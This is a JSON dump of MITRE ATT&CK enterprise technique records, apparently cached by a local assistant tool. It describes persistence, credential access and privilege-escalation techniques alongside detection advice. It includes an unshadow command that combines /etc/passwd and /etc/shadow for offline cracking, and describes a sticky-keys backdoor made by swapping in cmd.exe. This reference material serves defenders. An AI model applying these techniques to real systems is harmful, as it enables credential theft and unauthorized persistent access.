/home/archir/.mitre-assistant/matrixes/enterprise.json
Technique Thread Worker: Done | 568 Items
[
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"external_references\":[{\"external_id\":\"T1156\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1156\"},{\"description\":\"Claud Xiao, Cong Zheng, Yanhui Jia. (2017, April 6). New IoT/Linux Malware Targets DVRs, Forms Botnet. Retrieved February 19, 2018.\",\"source_name\":\"amnesia malware\",\"url\":\"https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/\"}],\"id\":\"attack-pattern--01df3350-ce05-4bdf-bdf8-0a919a66d4a8\",\"modified\":\"2020-01-24T14:14:05.452Z\",\"name\":\".bash_profile and .bashrc\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T14:13:45.936Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence by executing malicious content triggered by a user’s shell. <code>~/.bash_profile</code> and <code>~/.bashrc</code> are shell scripts that contain shell commands. These files are executed in a user\'s context when a new shell opens or when a user logs in so that their environment is set correctly.\\n\\n<code>~/.bash_profile</code> is executed for login shells and <code>~/.bashrc</code> is executed for interactive non-login shells. This means that when a user logs in (via username and password) to the console (either locally or remotely via something like SSH), the <code>~/.bash_profile</code> script is executed before the initial command prompt is returned to the user. After that, every time a new shell is opened, the <code>~/.bashrc</code> script is executed. This allows users more fine-grained control over when they want certain commands executed. These shell scripts are meant to be written to by the local user to configure their own environment.\\n\\nThe macOS Terminal.app is a little different in that it runs a login shell by default each time a new terminal window is opened, thus calling <code>~/.bash_profile</code> each time instead of <code>~/.bashrc</code>.\\n\\nAdversaries may abuse these shell scripts by inserting arbitrary shell commands that may be used to execute other binaries to gain persistence. Every time the user logs in or opens a new shell, the modified ~/.bash_profile and/or ~/.bashrc scripts will be executed.(Citation: amnesia malware)\",\"external_references\":[{\"external_id\":\"T1546.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/004\"},{\"description\":\"Claud Xiao, Cong Zheng, Yanhui Jia. (2017, April 6). New IoT/Linux Malware Targets DVRs, Forms Botnet. Retrieved February 19, 2018.\",\"source_name\":\"amnesia malware\",\"url\":\"https://researchcenter.paloaltonetworks.com/2017/04/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/\"}],\"id\":\"attack-pattern--b63a34e8-0a61-4c97-a23b-bf8a2ed812e2\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T16:28:04.990Z\",\"name\":\".bash_profile and .bashrc\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Process use of network\",\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"While users may customize their <code>~/.bashrc</code> and <code>~/.bash_profile</code> files , there are only certain types of commands that typically appear in these files. Monitor for abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network when user profiles are loaded during the login process.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-02-11T18:46:56.263Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to dump the contents of <code>/etc/passwd</code> and <code>/etc/shadow</code> to enable offline password cracking. Most modern Linux operating systems use a combination of <code>/etc/passwd</code> and <code>/etc/shadow</code> to store user account information including password hashes in <code>/etc/shadow</code>. By default, <code>/etc/shadow</code> is only readable by the root user.(Citation: Linux Password and Shadow File Formats)\\n\\nThe Linux utility, unshadow, can be used to combine the two files in a format suited for password cracking utilities such as John the Ripper:(Citation: nixCraft - John the Ripper) <code># /usr/bin/unshadow /etc/passwd /etc/shadow > /tmp/crack.password.db</code>\\n\",\"external_references\":[{\"external_id\":\"T1003.008\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1003/008\"},{\"description\":\"The Linux Documentation Project. (n.d.). Linux Password and Shadow File Formats. Retrieved February 19, 2020.\",\"source_name\":\"Linux Password and Shadow File Formats\",\"url\":\"https://www.tldp.org/LDP/lame/LAME/linux-admin-made-easy/shadow-file-formats.html\"},{\"description\":\"Vivek Gite. (2014, September 17). Linux Password Cracking: Explain unshadow and john Commands (John the Ripper Tool). Retrieved February 19, 2020.\",\"source_name\":\"nixCraft - John the Ripper\",\"url\":\"https://www.cyberciti.biz/faq/unix-linux-password-cracking-john-the-ripper/\"}],\"id\":\"attack-pattern--d0b4fcdb-d67d-4ed2-99ce-788b12f8c0f4\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"credential-access\"}],\"modified\":\"2020-03-20T15:56:55.022Z\",\"name\":\"/etc/passwd and /etc/shadow\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_detection\":\"The AuditD monitoring tool, which ships stock in many Linux distributions, can be used to watch for hostile processes attempting to access <code>/etc/passwd</code> and <code>/etc/shadow</code>, alerting on the pid, process name, and arguments of such programs.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"root\"],\"x_mitre_platforms\":[\"Linux\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-01-30T13:58:14.373Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may circumvent mechanisms designed to control elevate privileges to gain higher-level permissions. Most modern systems contain native elevation control mechanisms that are intended to limit privileges that a user can perform on a machine. Authorization has to be granted to specific users in order to perform tasks that can be considered of higher risk. An adversary can perform several methods to take advantage of built-in control mechanisms in order to escalate privileges on a system.\",\"external_references\":[{\"external_id\":\"T1548\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1548\"}],\"id\":\"attack-pattern--67720091-eee3-4d2d-ae16-8264567f6f5b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-25T19:57:54.923Z\",\"name\":\"Abuse Elevation Control Mechanism\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows Registry\",\"File monitoring\",\"Process command-line parameters\",\"API monitoring\",\"Process monitoring\"],\"x_mitre_detection\":\"Monitor the file system for files that have the setuid or setgid bits set. Also look for any process API calls for behavior that may be indicative of [Process Injection](https://attack.mitre.org/techniques/T1055) and unusual loaded DLLs through [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1574/001), which indicate attempts to gain access to higher privileged processes. On Linux, auditd can alert every time a user\'s actual ID and effective ID are different (this is what happens when you sudo).\\n\\nConsider monitoring for <code>/usr/libexec/security_authtrampoline</code> executions which may indicate that AuthorizationExecuteWithPrivileges is being executed. MacOS system logs may also indicate when AuthorizationExecuteWithPrivileges is being called. Monitoring OS API callbacks for the execution can also be a way to detect this behavior but requires specialized security tooling.\\n\\nOn Linux, auditd can alert every time a user\'s actual ID and effective ID are different (this is what happens when you sudo). This technique is abusing normal functionality in macOS and Linux systems, but sudo has the ability to log all input and output based on the <code>LOG_INPUT</code> and <code>LOG_OUTPUT</code> directives in the <code>/etc/sudoers</code> file.\\n\\nThere are many ways to perform UAC bypasses when a user is in the local administrator group on a system, so it may be difficult to target detection on all variations. Efforts should likely be placed on mitigation and collecting enough information on process launches and actions that could be performed before and after a UAC bypass is performed. Some UAC bypass methods rely on modifying specific, user-accessible Registry settings. Analysts should monitor Registry settings for unauthorized changes.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"Administrator\",\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-12-14T16:46:06.044Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may modify access tokens to operate under a different user or system security context to perform actions and bypass access controls. Windows uses access tokens to determine the ownership of a running process. A user can manipulate access tokens to make a running process appear as though it is the child of a different process or belongs to someone other than the user that started the process. When this occurs, the process also takes on the security context associated with the new token.\\n\\nAn adversary can use built-in Windows API functions to copy access tokens from existing processes; this is known as token stealing. These token can then be applied to an existing process (i.e. [Token Impersonation/Theft](https://attack.mitre.org/techniques/T1134/001)) or used to spawn a new process (i.e. [Create Process with Token](https://attack.mitre.org/techniques/T1134/002)). An adversary must already be in a privileged user context (i.e. administrator) to steal a token. However, adversaries commonly use token stealing to elevate their security context from the administrator level to the SYSTEM level. An adversary can then use a token to authenticate to a remote system as the account for that token if the account has appropriate permissions on the remote system.(Citation: Pentestlab Token Manipulation)\\n\\nAny standard user can use the <code>runas</code> command, and the Windows API functions, to create impersonation tokens; it does not require access to an administrator account. There are also other mechanisms, such as Active Directory fields, that can be used to modify access tokens.\",\"external_references\":[{\"external_id\":\"T1134\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1134\"},{\"external_id\":\"CAPEC-633\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/633.html\"},{\"description\":\"netbiosX. (2017, April 3). Token Manipulation. Retrieved April 21, 2017.\",\"source_name\":\"Pentestlab Token Manipulation\",\"url\":\"https://pentestlab.blog/2017/04/03/token-manipulation/\"},{\"description\":\"Mathers, B. (2017, March 7). Command line process auditing. Retrieved April 21, 2017.\",\"source_name\":\"Microsoft Command-line Logging\",\"url\":\"https://technet.microsoft.com/en-us/windows-server-docs/identity/ad-ds/manage/component-updates/command-line-process-auditing\"},{\"description\":\"Microsoft TechNet. (n.d.). Retrieved April 25, 2017.\",\"source_name\":\"Microsoft LogonUser\",\"url\":\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa378184(v=vs.85).aspx\"},{\"description\":\"Microsoft TechNet. (n.d.). Retrieved April 25, 2017.\",\"source_name\":\"Microsoft DuplicateTokenEx\",\"url\":\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx\"},{\"description\":\"Microsoft TechNet. (n.d.). Retrieved April 25, 2017.\",\"source_name\":\"Microsoft ImpersonateLoggedOnUser\",\"url\":\"https://msdn.microsoft.com/en-us/library/windows/desktop/aa378612(v=vs.85).aspx\"},{\"description\":\"Atkinson, J., Winchester, R. (2017, December 7). A Process is No One: Hunting for Token Manipulation. Retrieved December 21, 2017.\",\"source_name\":\"BlackHat Atkinson Winchester Token Manipulation\",\"url\":\"https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf\"}],\"id\":\"attack-pattern--dcaa092b-7de9-4a21-977f-7fcb77e89c48\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"}],\"modified\":\"2020-04-16T19:37:02.355Z\",\"name\":\"Access Token Manipulation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Tom Ueltschi @c_APT_ure\",\"Travis Smith, Tripwire\",\"Robby Winchester, @robwinchester3\",\"Jared Atkinson, @jaredcatkinson\"],\"x_mitre_data_sources\":[\"Authentication logs\",\"Windows event logs\",\"API monitoring\",\"Access tokens\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_defense_bypassed\":[\"Windows User Account Control\",\"System access controls\",\"File system access controls\",\"Heuristic Detection\",\"Host forensic analysis\"],\"x_mitre_detection\":\"If an adversary is using a standard command-line shell, analysts can detect token manipulation by auditing command-line activity. Specifically, analysts should look for use of the <code>runas</code> command. Detailed command-line logging is not enabled by default in Windows.(Citation: Microsoft Command-line Logging)\\n\\nIf an adversary is using a payload that calls the Windows token APIs directly, analysts can detect token manipulation only through careful analysis of user network activity, examination of running processes, and correlation with other endpoint and network behavior. \\n\\nThere are many Windows API calls a payload can take advantage of to manipulate access tokens (e.g., <code>LogonUser</code> (Citation: Microsoft LogonUser), <code>DuplicateTokenEx</code>(Citation: Microsoft DuplicateTokenEx), and <code>ImpersonateLoggedOnUser</code>(Citation: Microsoft ImpersonateLoggedOnUser)). Please see the referenced Windows API pages for more information.\\n\\nQuery systems for process and thread token information and look for inconsistencies such as user owns processes impersonating the local SYSTEM account.(Citation: BlackHat Atkinson Winchester Token Manipulation)\\n\\nLook for inconsistencies between the various fields that store PPID information, such as the EventHeader ProcessId from data collected via Event Tracing for Windows (ETW), Creator Process ID/Name from Windows event logs, and the ProcessID and ParentProcessID (which are also produced from ETW and other utilities such as Task Manager and Process Explorer). The ETW provided EventHeader ProcessId identifies the actual parent process.\",\"x_mitre_effective_permissions\":[\"SYSTEM\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"2.0\"}",
    "{\"created\":\"2017-05-31T21:30:26.946Z\",\"external_references\":[{\"external_id\":\"T1015\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1015\"},{\"external_id\":\"CAPEC-558\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/558.html\"},{\"description\":\"Glyer, C., Kazanciyan, R. (2012, August 20). The “Hikit” Rootkit: Advanced and Persistent Attack Techniques (Part 1). Retrieved June 6, 2016.\",\"source_name\":\"FireEye Hikit Rootkit\",\"url\":\"https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html\"},{\"description\":\"Maldonado, D., McGuffin, T. (2016, August 6). Sticky Keys to the Kingdom. Retrieved July 5, 2017.\",\"source_name\":\"DEFCON2016 Sticky Keys\",\"url\":\"https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom\"},{\"description\":\"Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.\",\"source_name\":\"Tilbury 2014\",\"url\":\"http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/\"}],\"id\":\"attack-pattern--9b99b83a-1aac-4e29-b975-b374950551a3\",\"modified\":\"2020-05-13T20:37:30.008Z\",\"name\":\"Accessibility Features\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-01-24T14:32:40.315Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.\\n\\nTwo common accessibility programs are <code>C:\\\\Windows\\\\System32\\\\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\\\\Windows\\\\System32\\\\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as \\\"sticky keys\\\", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)\\n\\nDepending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\\\\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.\\n\\nFor simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\\\\Windows\\\\System32\\\\utilman.exe</code>) may be replaced with \\\"cmd.exe\\\" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)\\n\\nOther accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)\\n\\n* On-Screen Keyboard: <code>C:\\\\Windows\\\\System32\\\\osk.exe</code>\\n* Magnifier: <code>C:\\\\Windows\\\\System32\\\\Magnify.exe</code>\\n* Narrator: <code>C:\\\\Windows\\\\System32\\\\Narrator.exe</code>\\n* Display Switcher: <code>C:\\\\Windows\\\\System32\\\\DisplaySwitch.exe</code>\\n* App Switcher: <code>C:\\\\Windows\\\\System32\\\\AtBroker.exe</code>\",\"external_references\":[{\"external_id\":\"T1546.008\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1546/008\"},{\"external_id\":\"CAPEC-558\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/558.html\"},{\"description\":\"Glyer, C., Kazanciyan, R. (2012, August 20). The “Hikit” Rootkit: Advanced and Persistent Attack Techniques (Part 1). Retrieved June 6, 2016.\",\"source_name\":\"FireEye Hikit Rootkit\",\"url\":\"https://www.fireeye.com/blog/threat-research/2012/08/hikit-rootkit-advanced-persistent-attack-techniques-part-1.html\"},{\"description\":\"Maldonado, D., McGuffin, T. (2016, August 6). Sticky Keys to the Kingdom. Retrieved July 5, 2017.\",\"source_name\":\"DEFCON2016 Sticky Keys\",\"url\":\"https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom\"},{\"description\":\"Tilbury, C. (2014, August 28). Registry Analysis with CrowdResponse. Retrieved November 12, 2014.\",\"source_name\":\"Tilbury 2014\",\"url\":\"http://blog.crowdstrike.com/registry-analysis-with-crowdresponse/\"},{\"description\":\"Comi, G. (2019, October 19). Abusing Windows 10 Narrator\'s \'Feedback-Hub\' URI for Fileless Persistence. Retrieved April 28, 2020.\",\"source_name\":\"Narrator Accessibility Abuse\",\"url\":\"https://giuliocomi.blogspot.com/2019/10/abusing-windows-10-narrators-feedback.html\"}],\"id\":\"attack-pattern--70e52b04-2a0c-4cea-9d18-7149f1df9dc5\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-05-13T20:37:30.048Z\",\"name\":\"Accessibility Features\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Paul Speulstra, AECOM Global Security Operations Center\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"File monitoring\",\"Windows Registry\"],\"x_mitre_detection\":\"Changes to accessibility utility binaries or binary paths that do not correlate with known software, patch cycles, etc., are suspicious. Command line invocation of tools capable of modifying the Registry for associated keys are also suspicious. Utility arguments and the binaries themselves should be monitored for changes. Monitor Registry keys within <code>HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options</code>.\",\"x_mitre_effective_permissions\":[\"SYSTEM\"],\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2019-10-09T18:48:31.906Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts.\\n\\nAdversaries may also subsequently log off and/or reboot boxes to set malicious changes into place.(Citation: CarbonBlack LockerGoga 2019)(Citation: Unit42 LockerGoga 2019)\",\"external_references\":[{\"external_id\":\"T1531\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1531\"},{\"description\":\"CarbonBlack Threat Analysis Unit. (2019, March 22). TAU Threat Intelligence Notification – LockerGoga Ransomware. Retrieved April 16, 2019.\",\"source_name\":\"CarbonBlack LockerGoga 2019\",\"url\":\"https://www.carbonblack.com/2019/03/22/tau-threat-intelligence-notification-lockergoga-ransomware/\"},{\"description\":\"Harbison, M.. (2019, March 26). Born This Way? Origins of LockerGoga. Retrieved April 16, 2019.\",\"source_name\":\"Unit42 LockerGoga 2019\",\"url\":\"https://unit42.paloaltonetworks.com/born-this-way-origins-of-lockergoga/\"}],\"id\":\"attack-pattern--b24e2a20-3b3d-4bf0-823b-1ed765398fb0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2019-10-14T23:29:24.908Z\",\"name\":\"Account Access Removal\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Windows event logs\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and command line parameters of binaries involved in deleting accounts or changing passwords, such as use of [Net](https://attack.mitre.org/software/S0039). Windows event logs may also designate activity associated with an adversary\'s attempt to remove access to an account:\\n\\n* Event ID 4723 - An attempt was made to change an account\'s password\\n* Event ID 4724 - An attempt was made to reset an account\'s password\\n* Event ID 4726 - A user account was deleted\\n* Event ID 4740 - A user account was locked out\\n\\nAlerting on [Net](https://attack.mitre.org/software/S0039) and these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"root\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:06.988Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may attempt to get a listing of accounts on a system or within an environment. This information can help adversaries determine which accounts exist to aid in follow-on behavior.\",\"external_references\":[{\"external_id\":\"T1087\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1087\"}],\"id\":\"attack-pattern--72b74d71-8169-42aa-92e0-e7b04b9f5a08\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"discovery\"}],\"modified\":\"2020-03-26T15:27:59.127Z\",\"name\":\"Account Discovery\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Microsoft Threat Intelligence Center (MSTIC)\",\"Travis Smith, Tripwire\"],\"x_mitre_data_sources\":[\"Azure activity logs\",\"Office 365 account logs\",\"API monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\\n\\nMonitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"Office 365\",\"Azure AD\",\"AWS\",\"GCP\",\"Azure\",\"SaaS\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2017-05-31T21:31:12.196Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups. These actions could also include account activity designed to subvert security policies, such as performing iterative password updates to bypass password duration policies and preserve the life of compromised credentials. In order to create or manipulate accounts, the adversary must already have sufficient permissions on systems or the domain.\",\"external_references\":[{\"external_id\":\"T1098\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1098\"},{\"description\":\"Lich, B., Miroshnikov, A. (2017, April 5). 4738(S): A user account was changed. Retrieved June 30, 2017.\",\"source_name\":\"Microsoft User Modified Event\",\"url\":\"https://docs.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4738\"},{\"description\":\"Franklin Smith, R. (n.d.). Windows Security Log Event ID 4670. Retrieved November 4, 2019.\",\"source_name\":\"Microsoft Security Event 4670\",\"url\":\"https://www.ultimatewindowssecurity.com/securitylog/encyclopedia/event.aspx?eventID=4670\"},{\"description\":\"Warren, J. (2017, July 11). Manipulating User Passwords with Mimikatz. Retrieved December 4, 2017.\",\"source_name\":\"InsiderThreat ChangeNTLM July 2017\",\"url\":\"https://blog.stealthbits.com/manipulating-user-passwords-with-mimikatz-SetNTLM-ChangeNTLM\"},{\"description\":\"Warren, J. (2017, June 22). lsadump::changentlm and lsadump::setntlm work, but generate Windows events #92. Retrieved December 4, 2017.\",\"source_name\":\"GitHub Mimikatz Issue 92 June 2017\",\"url\":\"https://github.com/gentilkiwi/mimikatz/issues/92\"}],\"id\":\"attack-pattern--a10641f4-87b4-45a3-a906-92a149cb2c27\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-06-25T16:32:23.685Z\",\"name\":\"Account Manipulation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Jannie Li, Microsoft Threat Intelligence\u{202f}Center\u{202f}(MSTIC)\",\"Praetorian\",\"Tim MalcomVetter\"],\"x_mitre_data_sources\":[\"Authentication logs\",\"Windows event logs\"],\"x_mitre_detection\":\"Collect events that correlate with changes to account objects and/or permissions on systems and the domain, such as event IDs 4738, 4728 and 4670.(Citation: Microsoft User Modified Event)(Citation: Microsoft Security Event 4670)(Citation: Microsoft Security Event 4670) Monitor for modification of accounts in correlation with other suspicious activity. Changes may occur at unusual times or from unusual systems. Especially flag events where the subject and target accounts differ(Citation: InsiderThreat ChangeNTLM July 2017) or that include additional flags such as changing a password without knowledge of the old password.(Citation: GitHub Mimikatz Issue 92 June 2017)\\n\\nMonitor for use of credentials at unusual times or to unusual systems or services. This may also correlate with other suspicious activity.\\n\\nMonitor for unusual permissions changes that may indicate excessively broad permissions being granted to compromised accounts.\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Windows\",\"Office 365\",\"Azure\",\"GCP\",\"Azure AD\",\"AWS\",\"Linux\",\"macOS\"],\"x_mitre_version\":\"2.1\"}",
    "{\"created\":\"2020-01-19T16:59:45.362Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"An adversary may add the Global Administrator role to an adversary-controlled account to maintain persistent access to an Office 365 tenant.(Citation: Microsoft Support O365 Add Another Admin, October 2019)(Citation: Microsoft O365 Admin Roles) With sufficient permissions, a compromised account can gain almost unlimited access to data and settings (including the ability to reset the passwords of other admins) via the global admin role.(Citation: Microsoft O365 Admin Roles) \\n\\nThis account modification may immediately follow [Create Account](https://attack.mitre.org/techniques/T1136) or other malicious account activity.\",\"external_references\":[{\"external_id\":\"T1098.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1098/003\"},{\"description\":\"Microsoft. (n.d.). Add Another Admin. Retrieved October 18, 2019.\",\"source_name\":\"Microsoft Support O365 Add Another Admin, October 2019\",\"url\":\"https://support.office.com/en-us/article/add-another-admin-f693489f-9f55-4bd0-a637-a81ce93de22d\"},{\"description\":\"Ako-Adjei, K., Dickhaus, M., Baumgartner, P., Faigel, D., et. al.. (2019, October 8). About admin roles. Retrieved October 18, 2019.\",\"source_name\":\"Microsoft O365 Admin Roles\",\"url\":\"https://docs.microsoft.com/en-us/office365/admin/add-users/about-admin-roles?view=o365-worldwide\"}],\"id\":\"attack-pattern--2dbbdcd5-92cf-44c0-aea2-fe24783a6bc3\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"}],\"modified\":\"2020-03-24T12:40:02.331Z\",\"name\":\"Add Office 365 Global Administrator Role\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Microsoft Threat Intelligence Center (MSTIC)\"],\"x_mitre_data_sources\":[\"Office 365 audit logs\"],\"x_mitre_detection\":\"Collect usage logs from cloud administrator accounts to identify unusual activity in the assignment of roles to those accounts. Monitor for accounts assigned to admin roles that go over a certain threshold of known admins. \",\"x_mitre_is_subtechnique\":true,\"x_mitre_permissions_required\":[\"Administrator\"],\"x_mitre_platforms\":[\"Office 365\"],\"x_mitre_version\":\"1.0\"}",
